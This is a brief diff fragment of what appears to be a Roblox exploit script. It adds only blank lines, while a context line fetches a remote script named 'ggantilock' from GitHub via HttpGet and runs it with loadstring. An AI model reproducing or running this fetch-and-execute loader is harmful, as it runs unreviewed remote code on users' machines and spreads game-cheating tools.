@@ -11,4 +11,6 @@ RunService.Heartbeat:Connect(function()
         end
     end)
 end)
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fear0004/script/main/ggantilock"))()
